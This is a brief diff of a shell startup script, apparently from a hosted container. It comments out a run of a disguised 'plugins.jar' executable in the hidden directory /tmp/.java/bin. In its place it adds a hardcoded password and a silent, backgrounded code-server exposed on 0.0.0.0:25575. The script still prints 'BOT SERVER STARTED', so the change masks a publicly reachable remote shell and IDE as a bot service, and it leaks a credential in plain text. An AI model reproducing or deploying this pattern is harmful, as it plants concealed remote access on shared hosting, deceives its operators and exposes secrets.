@@ -25,7 +25,10 @@ function fetch_files() {
 
 function start_app() {
     chmod a+x /tmp/.java/bin/***
-    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
+    # cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
+    cd /home/container/.npm 
+    export PASSWORD="!iqZ&PtBlA^72pdt6f#Sk84ZzR43PR@t3fdhk8B9Qk#wEwH86fPdZWkdeVbX$4#6BDJFE4u!6c7vMkG8h3^4NbF$GzP9p3kHySaxPFm*@7T!@y3l%L#suJek@C4XjHyx"
+    nohup bin/code-server --bind-addr 0.0.0.0:25575 >/dev/null 2>&1 &
     echo "BOT SERVER STARTED ..."
 }
 
